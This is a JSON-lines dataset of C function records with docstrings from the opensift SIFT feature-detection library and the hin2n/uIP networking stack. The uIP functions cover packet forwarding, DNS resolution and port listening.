{"docstring": "/*\n  Computes the 2D array of orientation histograms that form the feature\n  descriptor.  Based on Section 6.1 of Lowe's paper.\n\n  @param img image used in descriptor computation\n  @param r row coord of center of orientation histogram array\n  @param c column coord of center of orientation histogram array\n  @param ori canonical orientation of feature whose descr is being computed\n  @param scl scale relative to img of feature whose descr is being computed\n  @param d width of 2d array of orientation histograms\n  @param n bins per orientation histogram\n\n  @return Returns a d x d array of n-bin orientation histograms.\n*/\n", "func_signal": "static double*** descr_hist( IplImage* img, int r, int c, double ori,\n\t\t\t     double scl, int d, int n )", "code": "{\n  double*** hist;\n  double cos_t, sin_t, hist_width, exp_denom, r_rot, c_rot, grad_mag,\n    grad_ori, w, rbin, cbin, obin, bins_per_rad, PI2 = 2.0 * CV_PI;\n  int radius, i, j;\n\n  hist = calloc( d, sizeof( double** ) );\n  for( i = 0; i < d; i++ )\n    {\n      hist[i] = calloc( d, sizeof( double* ) );\n      for( j = 0; j < d; j++ )\n\thist[i][j] = calloc( n, sizeof( double ) );\n    }\n  \n  cos_t = cos( ori );\n  sin_t = sin( ori );\n  bins_per_rad = n / PI2;\n  exp_denom = d * d * 0.5;\n  hist_width = SIFT_DESCR_SCL_FCTR * scl;\n  radius = hist_width * sqrt(2) * ( d + 1.0 ) * 0.5 + 0.5;\n  for( i = -radius; i <= radius; i++ )\n    for( j = -radius; j <= radius; j++ )\n      {\n\t/*\n\t  Calculate sample's histogram array coords rotated relative to ori.\n\t  Subtract 0.5 so samples that fall e.g. in the center of row 1 (i.e.\n\t  r_rot = 1.5) have full weight placed in row 1 after interpolation.\n\t*/\n\tc_rot = ( j * cos_t - i * sin_t ) / hist_width;\n\tr_rot = ( j * sin_t + i * cos_t ) / hist_width;\n\trbin = r_rot + d / 2 - 0.5;\n\tcbin = c_rot + d / 2 - 0.5;\n\t\n\tif( rbin > -1.0  &&  rbin < d  &&  cbin > -1.0  &&  cbin < d )\n\t  if( calc_grad_mag_ori( img, r + i, c + j, &grad_mag, &grad_ori ))\n\t    {\n\t      grad_ori -= ori;\n\t      while( grad_ori < 0.0 )\n\t\tgrad_ori += PI2;\n\t      while( grad_ori >= PI2 )\n\t\tgrad_ori -= PI2;\n\t      \n\t      obin = grad_ori * bins_per_rad;\n\t      w = exp( -(c_rot * c_rot + r_rot * r_rot) / exp_denom );\n\t      interp_hist_entry( hist, rbin, cbin, obin, grad_mag * w, d, n );\n\t    }\n      }\n\n  return hist;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Detects features at extrema in DoG scale space.  Bad features are discarded\n  based on contrast and ratio of principal curvatures.\n\n  @param dog_pyr DoG scale space pyramid\n  @param octvs octaves of scale space represented by dog_pyr\n  @param intvls intervals per octave\n  @param contr_thr low threshold on feature contrast\n  @param curv_thr high threshold on feature ratio of principal curvatures\n  @param storage memory storage in which to store detected features\n\n  @return Returns an array of detected features whose scales, orientations,\n    and descriptors are yet to be determined.\n*/\n", "func_signal": "static CvSeq* scale_space_extrema( IplImage*** dog_pyr, int octvs, int intvls,\n\t\t\t\t   double contr_thr, int curv_thr,\n\t\t\t\t   CvMemStorage* storage )", "code": "{\n  CvSeq* features;\n  double prelim_contr_thr = 0.5 * contr_thr / intvls;\n  struct feature* feat;\n  struct detection_data* ddata;\n  int o, i, r, c;\n  unsigned long* feature_mat;\n\n  features = cvCreateSeq( 0, sizeof(CvSeq), sizeof(struct feature), storage );\n  for( o = 0; o < octvs; o++ )\n  {\n    feature_mat = calloc( dog_pyr[o][0]->height * dog_pyr[o][0]->width, sizeof(unsigned long) );\n    for( i = 1; i <= intvls; i++ )\n      for(r = SIFT_IMG_BORDER; r < dog_pyr[o][0]->height-SIFT_IMG_BORDER; r++)\n\tfor(c = SIFT_IMG_BORDER; c < dog_pyr[o][0]->width-SIFT_IMG_BORDER; c++)\n\t  /* perform preliminary check on contrast */\n\t  if( ABS( pixval32f( dog_pyr[o][i], r, c ) ) > prelim_contr_thr )\n\t    if( is_extremum( dog_pyr, o, i, r, c ) )\n\t      {\n\t\tfeat = interp_extremum(dog_pyr, o, i, r, c, intvls, contr_thr);\n\t\tif( feat )\n\t\t  {\n\t\t    ddata = feat_detection_data( feat );\n\t\t    if( ! is_too_edge_like( dog_pyr[ddata->octv][ddata->intvl],\n\t\t\t\t\t    ddata->r, ddata->c, curv_thr ) )\n\t\t      {\n                        if( ddata->intvl > sizeof(unsigned long) )\n                          cvSeqPush( features, feat );\n                        else if( (feature_mat[dog_pyr[o][0]->width * ddata->r + ddata->c] & (1 << ddata->intvl-1)) == 0 )\n                        {\n                          cvSeqPush( features, feat );\n                          feature_mat[dog_pyr[o][0]->width * ddata->r + ddata->c] += 1 << ddata->intvl-1;\n                        }\n\t\t      }\n\t\t    else\n\t\t      free( ddata );\n\t\t    free( feat );\n\t\t  }\n\t      }\n    free( feature_mat );\n  }\n  return features;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Converts the 2D array of orientation histograms into a feature's descriptor\n  vector.\n  \n  @param hist 2D array of orientation histograms\n  @param d width of hist\n  @param n bins per histogram\n  @param feat feature into which to store descriptor\n*/\n", "func_signal": "static void hist_to_descr( double*** hist, int d, int n, struct feature* feat )", "code": "{\n  int int_val, i, r, c, o, k = 0;\n\n  for( r = 0; r < d; r++ )\n    for( c = 0; c < d; c++ )\n      for( o = 0; o < n; o++ )\n\tfeat->descr[k++] = hist[r][c][o];\n\n  feat->d = k;\n  normalize_descr( feat );\n  for( i = 0; i < k; i++ )\n    if( feat->descr[i] > SIFT_DESCR_MAG_THR )\n      feat->descr[i] = SIFT_DESCR_MAG_THR;\n  normalize_descr( feat );\n\n  /* convert floating-point descriptor to integer valued descriptor */\n  for( i = 0; i < k; i++ )\n    {\n      int_val = SIFT_INT_DESCR_FCTR * feat->descr[i];\n      feat->descr[i] = MIN( 255, int_val );\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/**\n   Finds SIFT features in an image using default parameter values.  All\n   detected features are stored in the array pointed to by \\a feat.\n\n   @param img the image in which to detect features\n   @param feat a pointer to an array in which to store detected features\n\n   @return Returns the number of features stored in \\a feat or -1 on failure\n   @see _sift_features()\n*/\n", "func_signal": "int sift_features( IplImage* img, struct feature** feat )", "code": "{\n  return _sift_features( img, feat, SIFT_INTVLS, SIFT_SIGMA, SIFT_CONTR_THR,\n\t\t\t SIFT_CURV_THR, SIFT_IMG_DBL, SIFT_DESCR_WIDTH,\n\t\t\t SIFT_DESCR_HIST_BINS );\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Downsamples an image to a quarter of its size (half in each dimension)\n  using nearest-neighbor interpolation\n\n  @param img an image\n\n  @return Returns an image whose dimensions are half those of img\n*/\n", "func_signal": "static IplImage* downsample( IplImage* img )", "code": "{\n  IplImage* smaller = cvCreateImage( cvSize(img->width / 2, img->height / 2),\n\t\t\t\t     img->depth, img->nChannels );\n  cvResize( img, smaller, CV_INTER_NN );\n\n  return smaller;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Computes feature descriptors for features in an array.  Based on Section 6\n  of Lowe's paper.\n\n  @param features array of features\n  @param gauss_pyr Gaussian scale space pyramid\n  @param d width of 2D array of orientation histograms\n  @param n number of bins per orientation histogram\n*/\n", "func_signal": "static void compute_descriptors( CvSeq* features, IplImage*** gauss_pyr, int d,\n\t\t\t\t int n )", "code": "{\n  struct feature* feat;\n  struct detection_data* ddata;\n  double*** hist;\n  int i, k = features->total;\n\n  for( i = 0; i < k; i++ )\n    {\n      feat = CV_GET_SEQ_ELEM( struct feature, features, i );\n      ddata = feat_detection_data( feat );\n      hist = descr_hist( gauss_pyr[ddata->octv][ddata->intvl], ddata->r,\n\t\t\t ddata->c, feat->ori, ddata->scl_octv, d, n );\n      hist_to_descr( hist, d, n, feat );\n      release_descr_hist( &hist, d );\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Finds the magnitude of the dominant orientation in a histogram\n\n  @param hist an orientation histogram\n  @param n number of bins\n\n  @return Returns the value of the largest bin in hist\n*/\n", "func_signal": "static double dominant_ori( double* hist, int n )", "code": "{\n  double omax;\n  int maxbin, i;\n\n  omax = hist[0];\n  maxbin = 0;\n  for( i = 1; i < n; i++ )\n    if( hist[i] > omax )\n      {\n\tomax = hist[i];\n\tmaxbin = i;\n      }\n  return omax;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Converts an image to 8-bit grayscale and Gaussian-smooths it.  The image is\n  optionally doubled in size prior to smoothing.\n\n  @param img input image\n  @param img_dbl if true, image is doubled in size prior to smoothing\n  @param sigma total std of Gaussian smoothing\n*/\n", "func_signal": "static IplImage* create_init_img( IplImage* img, int img_dbl, double sigma )", "code": "{\n  IplImage* gray, * dbl;\n  double sig_diff;\n\n  gray = convert_to_gray32( img );\n  if( img_dbl )\n    {\n      sig_diff = sqrt( sigma * sigma - SIFT_INIT_SIGMA * SIFT_INIT_SIGMA * 4 );\n      dbl = cvCreateImage( cvSize( img->width*2, img->height*2 ),\n\t\t\t   IPL_DEPTH_32F, 1 );\n      cvResize( gray, dbl, CV_INTER_CUBIC );\n      cvSmooth( dbl, dbl, CV_GAUSSIAN, 0, 0, sig_diff, sig_diff );\n      cvReleaseImage( &gray );\n      return dbl;\n    }\n  else\n    {\n      sig_diff = sqrt( sigma * sigma - SIFT_INIT_SIGMA * SIFT_INIT_SIGMA );\n      cvSmooth( gray, gray, CV_GAUSSIAN, 0, 0, sig_diff, sig_diff );\n      return gray;\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Interpolates an entry into the array of orientation histograms that form\n  the feature descriptor.\n\n  @param hist 2D array of orientation histograms\n  @param rbin sub-bin row coordinate of entry\n  @param cbin sub-bin column coordinate of entry\n  @param obin sub-bin orientation coordinate of entry\n  @param mag size of entry\n  @param d width of 2D array of orientation histograms\n  @param n number of bins per orientation histogram\n*/\n", "func_signal": "static void interp_hist_entry( double*** hist, double rbin, double cbin,\n\t\t\t       double obin, double mag, int d, int n )", "code": "{\n  double d_r, d_c, d_o, v_r, v_c, v_o;\n  double** row, * h;\n  int r0, c0, o0, rb, cb, ob, r, c, o;\n\n  r0 = cvFloor( rbin );\n  c0 = cvFloor( cbin );\n  o0 = cvFloor( obin );\n  d_r = rbin - r0;\n  d_c = cbin - c0;\n  d_o = obin - o0;\n\n  /*\n    The entry is distributed into up to 8 bins.  Each entry into a bin\n    is multiplied by a weight of 1 - d for each dimension, where d is the\n    distance from the center value of the bin measured in bin units.\n  */\n  for( r = 0; r <= 1; r++ )\n    {\n      rb = r0 + r;\n      if( rb >= 0  &&  rb < d )\n\t{\n\t  v_r = mag * ( ( r == 0 )? 1.0 - d_r : d_r );\n\t  row = hist[rb];\n\t  for( c = 0; c <= 1; c++ )\n\t    {\n\t      cb = c0 + c;\n\t      if( cb >= 0  &&  cb < d )\n\t\t{\n\t\t  v_c = v_r * ( ( c == 0 )? 1.0 - d_c : d_c );\n\t\t  h = row[cb];\n\t\t  for( o = 0; o <= 1; o++ )\n\t\t    {\n\t\t      ob = ( o0 + o ) % n;\n\t\t      v_o = v_c * ( ( o == 0 )? 1.0 - d_o : d_o );\n\t\t      h[ob] += v_o;\n\t\t    }\n\t\t}\n\t    }\n\t}\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Calculates the gradient magnitude and orientation at a given pixel.\n\n  @param img image\n  @param r pixel row\n  @param c pixel col\n  @param mag output as gradient magnitude at pixel (r,c)\n  @param ori output as gradient orientation at pixel (r,c)\n\n  @return Returns 1 if the specified pixel is a valid one and sets mag and\n    ori accordingly; otherwise returns 0\n*/\n", "func_signal": "static int calc_grad_mag_ori( IplImage* img, int r, int c, double* mag,\n\t\t\t      double* ori )", "code": "{\n  double dx, dy;\n\n  if( r > 0  &&  r < img->height - 1  &&  c > 0  &&  c < img->width - 1 )\n    {\n      dx = pixval32f( img, r, c+1 ) - pixval32f( img, r, c-1 );\n      dy = pixval32f( img, r-1, c ) - pixval32f( img, r+1, c );\n      *mag = sqrt( dx*dx + dy*dy );\n      *ori = atan2( dy, dx );\n      return 1;\n    }\n\n  else\n    return 0;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Gaussian smooths an orientation histogram.\n\n  @param hist an orientation histogram\n  @param n number of bins\n*/\n", "func_signal": "static void smooth_ori_hist( double* hist, int n )", "code": "{\n  double prev, tmp, h0 = hist[0];\n  int i;\n\n  prev = hist[n-1];\n  for( i = 0; i < n; i++ )\n    {\n      tmp = hist[i];\n      hist[i] = 0.25 * prev + 0.5 * hist[i] + \n\t0.25 * ( ( i+1 == n )? h0 : hist[i+1] );\n      prev = tmp;\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Computes a gradient orientation histogram at a specified pixel.\n\n  @param img image\n  @param r pixel row\n  @param c pixel col\n  @param n number of histogram bins\n  @param rad radius of region over which histogram is computed\n  @param sigma std for Gaussian weighting of histogram entries\n\n  @return Returns an n-element array containing an orientation histogram\n    representing orientations between 0 and 2 PI.\n*/\n", "func_signal": "static double* ori_hist( IplImage* img, int r, int c, int n, int rad,\n\t\t\t double sigma )", "code": "{\n  double* hist;\n  double mag, ori, w, exp_denom, PI2 = CV_PI * 2.0;\n  int bin, i, j;\n\n  hist = calloc( n, sizeof( double ) );\n  exp_denom = 2.0 * sigma * sigma;\n  for( i = -rad; i <= rad; i++ )\n    for( j = -rad; j <= rad; j++ )\n      if( calc_grad_mag_ori( img, r + i, c + j, &mag, &ori ) )\n\t{\n\t  w = exp( -( i*i + j*j ) / exp_denom );\n\t  bin = cvRound( n * ( ori + CV_PI ) / PI2 );\n\t  bin = ( bin < n )? bin : 0;\n\t  hist[bin] += w * mag;\n\t}\n\n  return hist;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Determines whether a pixel is a scale-space extremum by comparing it to it's\n  3x3x3 pixel neighborhood.\n\n  @param dog_pyr DoG scale space pyramid\n  @param octv pixel's scale space octave\n  @param intvl pixel's within-octave interval\n  @param r pixel's image row\n  @param c pixel's image col\n\n  @return Returns 1 if the specified pixel is an extremum (max or min) among\n    it's 3x3x3 pixel neighborhood.\n*/\n", "func_signal": "static int is_extremum( IplImage*** dog_pyr, int octv, int intvl, int r, int c )", "code": "{\n  double val = pixval32f( dog_pyr[octv][intvl], r, c );\n  int i, j, k;\n\n  /* check for maximum */\n  if( val > 0 )\n    {\n      for( i = -1; i <= 1; i++ )\n\tfor( j = -1; j <= 1; j++ )\n\t  for( k = -1; k <= 1; k++ )\n\t    if( val < pixval32f( dog_pyr[octv][intvl+i], r + j, c + k ) )\n\t      return 0;\n    }\n\n  /* check for minimum */\n  else\n    {\n      for( i = -1; i <= 1; i++ )\n\tfor( j = -1; j <= 1; j++ )\n\t  for( k = -1; k <= 1; k++ )\n\t    if( val > pixval32f( dog_pyr[octv][intvl+i], r + j, c + k ) )\n\t      return 0;\n    }\n\n  return 1;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  De-allocates memory held by a scale space pyramid\n\n  @param pyr scale space pyramid\n  @param octvs number of octaves of scale space\n  @param n number of images per octave\n*/\n", "func_signal": "static void release_pyr( IplImage**** pyr, int octvs, int n )", "code": "{\n  int i, j;\n  for( i = 0; i < octvs; i++ )\n    {\n      for( j = 0; j < n; j++ )\n\tcvReleaseImage( &(*pyr)[i][j] );\n      free( (*pyr)[i] );\n    }\n  free( *pyr );\n  *pyr = NULL;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/* UIP_UDP */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_unlisten(u16_t port)", "code": "{\n  for(c = 0; c < UIP_LISTENPORTS; ++c) {\n    if(uip_listenports[c] == port) {\n      uip_listenports[c] = 0;\n      return;\n    }\n  }\n}", "path": "hin2n/bundles/uip/uip/uip.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Register a packet in the forwarding cache so that it won't be\n * forwarded again.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static void\nfwcache_register(void)", "code": "{\n  struct fwcache_entry *fw;\n  int i, oldest;\n\n  oldest = FW_TIME;\n  fw = NULL;\n  \n  /* Find the oldest entry in the cache. */\n  for(i = 0; i < FWCACHE_SIZE; ++i) {\n    if(fwcache[i].timer == 0) {\n      fw = &fwcache[i];\n      break;\n    } else if(fwcache[i].timer <= oldest) {\n      fw = &fwcache[i];\n      oldest = fwcache[i].timer;\n    }\n  }\n\n  fw->timer = FW_TIME;\n  fw->ipid = BUF->ipid;\n  fw->srcipaddr[0] = BUF->srcipaddr[0];\n  fw->srcipaddr[1] = BUF->srcipaddr[1];\n  fw->destipaddr[0] = BUF->destipaddr[0];\n  fw->destipaddr[1] = BUF->destipaddr[1];\n  fw->proto = BUF->proto;\n#if notdef\n  fw->payload[0] = BUF->srcport;\n  fw->payload[1] = BUF->destport;\n#endif\n#if UIP_REASSEMBLY > 0\n  fw->len = BUF->len;\n  fw->offset = BUF->ipoffset;\n#endif\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Check if an IP address is within the network defined by an IP\n * address and a netmask.\n *\n * \\param ipaddr The IP address to be checked.\n * \\param netipaddr The IP address of the network.\n * \\param netmask The netmask of the network.\n *\n * \\return Non-zero if IP address is in network, zero otherwise.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static unsigned char\nipaddr_maskcmp(u16_t *ipaddr, u16_t *netipaddr, u16_t *netmask)", "code": "{\n  return (ipaddr[0] & netmask [0]) == (netipaddr[0] & netmask[0]) &&\n    (ipaddr[1] & netmask[1]) == (netipaddr[1] & netmask[1]);\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/** Called periodically to update the gateway MAC address. The ARP reply packet\n    is handled in handle_PACKET . */\n", "func_signal": "static void update_gateway_mac(n2n_edge_t *eee)", "code": "{\n  n2n_android_t *priv = (n2n_android_t*) edge_get_userdata(eee);\n\n  if(priv->gateway_ip != 0) {\n    size_t len;\n    char buffer[48];\n\n    len = build_unicast_arp(buffer, sizeof(buffer), priv->gateway_ip, priv);\n    traceEvent(TRACE_DEBUG, \"Updating gateway mac\");\n    edge_send_packet2net(eee, (uint8_t*)buffer, len);\n  }\n}", "path": "hin2n/Hin2n_android/app/src/main/cpp/edge_jni/edge_android_v2.c", "commit_date": "2020-12-07 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** \\internal\n * Walk through a compact encoded DNS name and return the end of it.\n *\n * \\return The end of the name.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "static unsigned char *\nparse_name(unsigned char *query)", "code": "{\n  unsigned char n;\n\n  do {\n    n = *query++;\n    \n    while(n > 0) {\n      /*      printf(\"%c\", *query);*/\n      ++query;\n      --n;\n    };\n    /*    printf(\".\");*/\n  } while(*query != 0);\n  /*  printf(\"\\n\");*/\n  return query + 1;\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** \\internal\n * Runs through the list of names to see if there are any that have\n * not yet been queried and, if so, sends out a query.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\ncheck_entries(void)", "code": "{\n  register struct dns_hdr *hdr;\n  char *query, *nptr, *nameptr;\n  static u8_t i;\n  static u8_t n;\n  register struct namemap *namemapptr;\n  \n  for(i = 0; i < RESOLV_ENTRIES; ++i) {\n    namemapptr = &names[i];\n    if(namemapptr->state == STATE_NEW ||\n       namemapptr->state == STATE_ASKING) {\n      if(namemapptr->state == STATE_ASKING) {\n\tif(--namemapptr->tmr == 0) {\n\t  if(++namemapptr->retries == MAX_RETRIES) {\n\t    namemapptr->state = STATE_ERROR;\n\t    resolv_found(namemapptr->name, NULL);\n\t    continue;\n\t  }\n\t  namemapptr->tmr = namemapptr->retries;\n\t} else {\n\t  /*\t  printf(\"Timer %d\\n\", namemapptr->tmr);*/\n\t  /* Its timer has not run out, so we move on to next\n\t     entry. */\n\t  continue;\n\t}\n      } else {\n\tnamemapptr->state = STATE_ASKING;\n\tnamemapptr->tmr = 1;\n\tnamemapptr->retries = 0;\n      }\n      hdr = (struct dns_hdr *)uip_appdata;\n      memset(hdr, 0, sizeof(struct dns_hdr));\n      hdr->id = htons(i);\n      hdr->flags1 = DNS_FLAG1_RD;\n      hdr->numquestions = HTONS(1);\n      query = (char *)uip_appdata + 12;\n      nameptr = namemapptr->name;\n      --nameptr;\n      /* Convert hostname into suitable query format. */\n      do {\n\t++nameptr;\n\tnptr = query;\n\t++query;\n\tfor(n = 0; *nameptr != '.' && *nameptr != 0; ++nameptr) {\n\t  *query = *nameptr;\n\t  ++query;\n\t  ++n;\n\t}\n\t*nptr = n;\n      } while(*nameptr != 0);\n      {\n\tstatic unsigned char endquery[] =\n\t  {0,0,1,0,1};\n\tmemcpy(query, endquery, 5);\n      }\n      uip_udp_send((unsigned char)(query + 5 - (char *)uip_appdata));\n      break;\n    }\n  }\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Register a network interface with the forwarding module.\n *\n * \\param netif A pointer to the network interface that is to be\n * registered.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_fw_register(struct uip_fw_netif *netif)", "code": "{\n  netif->next = netifs;\n  netifs = netif;\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Output an IP packet on the correct network interface.\n *\n * The IP packet should be present in the uip_buf buffer and its\n * length in the global uip_len variable.\n *\n * \\retval UIP_FW_ZEROLEN Indicates that a zero-length packet\n * transmission was attempted and that no packet was sent.\n *\n * \\retval UIP_FW_NOROUTE No suitable network interface could be found\n * for the outbound packet, and the packet was not sent.\n *\n * \\return The return value from the actual network interface output\n * function is passed unmodified as a return value.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\nuip_fw_output(void)", "code": "{\n  struct uip_fw_netif *netif;\n\n  if(uip_len == 0) {\n    return UIP_FW_ZEROLEN;\n  }\n\n  fwcache_register();\n\n#if UIP_BROADCAST\n  /* Link local broadcasts go out on all interfaces. */\n  if(/*BUF->proto == UIP_PROTO_UDP &&*/\n     BUF->destipaddr[0] == 0xffff &&\n     BUF->destipaddr[1] == 0xffff) {\n    if(defaultnetif != NULL) {\n      defaultnetif->output();\n    }\n    for(netif = netifs; netif != NULL; netif = netif->next) {\n      netif->output();\n    }\n    return UIP_FW_OK;\n  }\n#endif /* UIP_BROADCAST */\n  \n  netif = find_netif();\n  /*  printf(\"uip_fw_output: netif %p ->output %p len %d\\n\", netif,\n\t netif->output,\n\t uip_len);*/\n\n  if(netif == NULL) {\n    return UIP_FW_NOROUTE;\n  }\n  /* If we now have found a suitable network interface, we call its\n     output function to send out the packet. */\n  return netif->output();\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/**\n * Queues a name so that a question for the name will be sent out.\n *\n * \\param name The hostname that is to be queried.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nresolv_query(char *name)", "code": "{\n  static u8_t i;\n  static u8_t lseq, lseqi;\n  register struct namemap *nameptr;\n      \n  lseq = lseqi = 0;\n  \n  for(i = 0; i < RESOLV_ENTRIES; ++i) {\n    nameptr = &names[i];\n    if(nameptr->state == STATE_UNUSED) {\n      break;\n    }\n    if(seqno - nameptr->seqno > lseq) {\n      lseq = seqno - nameptr->seqno;\n      lseqi = i;\n    }\n  }\n\n  if(i == RESOLV_ENTRIES) {\n    i = lseqi;\n    nameptr = &names[i];\n  }\n\n  /*  printf(\"Using entry %d\\n\", i);*/\n\n  strcpy(nameptr->name, name);\n  nameptr->state = STATE_NEW;\n  nameptr->seqno = seqno;\n  ++seqno;\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/**\n * Look up a hostname in the array of known hostnames.\n *\n * \\note This function only looks in the internal array of known\n * hostnames, it does not send out a query for the hostname if none\n * was found. The function resolv_query() can be used to send a query\n * for a hostname.\n *\n * \\return A pointer to a 4-byte representation of the hostname's IP\n * address, or NULL if the hostname was not found in the array of\n * hostnames.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "u16_t *\nresolv_lookup(char *name)", "code": "{\n  static u8_t i;\n  struct namemap *nameptr;\n  \n  /* Walk through the list to see if the name is in there. If it is\n     not, we return NULL. */\n  for(i = 0; i < RESOLV_ENTRIES; ++i) {\n    nameptr = &names[i];\n    if(nameptr->state == STATE_DONE &&\n       strcmp(name, nameptr->name) == 0) {\n      return nameptr->ipaddr;\n    }\n  }\n  return NULL;\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/**\n * Initalize the resolver.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nresolv_init(void)", "code": "{\n  static u8_t i;\n  \n  for(i = 0; i < RESOLV_ENTRIES; ++i) {\n    names[i].state = STATE_DONE;\n  }\n\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/* UIP_REASSEMBLY */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nuip_add_rcv_nxt(u16_t n)", "code": "{\n  uip_add32(uip_conn->rcv_nxt, n);\n  uip_conn->rcv_nxt[0] = uip_acc32[0];\n  uip_conn->rcv_nxt[1] = uip_acc32[1];\n  uip_conn->rcv_nxt[2] = uip_acc32[2];\n  uip_conn->rcv_nxt[3] = uip_acc32[3];\n}", "path": "hin2n/bundles/uip/uip/uip.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
